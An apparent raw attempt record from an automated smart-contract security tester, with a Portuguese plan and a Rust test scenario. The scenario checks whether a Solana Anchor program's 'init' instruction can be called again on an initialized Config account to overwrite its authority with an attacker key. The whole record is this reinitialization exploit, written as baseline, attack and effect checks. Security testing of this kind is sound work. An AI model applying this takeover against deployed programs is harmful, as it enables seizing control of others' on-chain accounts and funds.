attempts.raw:
{
  "plan": "Preparamos uma conta Config já inicializada com authority e is_initialized=true, e uma nova authority atacante. O baseline chama init legitimamente para criar a conta Config (usando empty_account e system_program). O ataque chama init novamente na mesma conta já inicializada, com a authority atacante, tentando sobrescrever o estado. O efeito verifica se a authority foi alterada para a atacante e se is_initialized permaneceu true, indicando reinicialização bem-sucedida.",
  "scenario": "let program_id = env.program_id;
let authority = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

// Conta Config vazia para o baseline (init)
let config_key = Pubkey::new_unique();
let config_account = empty_account();

// Contas para o baseline
let (system_program, system_account) = system_program_account();
let baseline_accounts = vec![
    (config_key, config_account.clone()),
    (authority, wallet(1_000_000_000)),
    (system_program, system_account.clone()),
];

// Metas para o baseline
let baseline_metas = vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new_readonly(system_program, false),
];

let baseline_ix = env.anchor_ix("init", &(), baseline_metas);
let baseline_result = env.baseline("init legitimo", &baseline_ix, &baseline_accounts);

// Extrair a conta Config resultante do baseline
let config_after_baseline = baseline_result.resulting_accounts.iter()
    .find(|(k, _)| *k == config_key)
    .map(|(_, acc)| acc.clone())
    .expect("conta config nao encontrada apos baseline");

// Ataque: chamar init novamente na mesma conta ja inicializada, com authority atacante
let attack_accounts = vec![
    (config_key, config_after_baseline.clone()),
    (attacker, wallet(1_000_000_000)),
    (system_program, system_account),
];

let attack_metas = vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(attacker, true),
    AccountMeta::new_readonly(system_program, false),
];

let attack_ix = env.anchor_ix("init", &(), attack_metas);
let attack_result = env.attack("reinit com authority atacante", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let config_data = after(&attack_result, &config_key).data();
    let stored_authority = read_pubkey(config_data, 8); // offset 8 apos discriminador
    let is_initialized = config_data[40] != 0; // offset 8 + 32 = 40
    env.effect("authority sobrescrita para atacante", stored_authority == attacker);
    env.effect("is_initialized permanece true", is_initialized);
}"
}

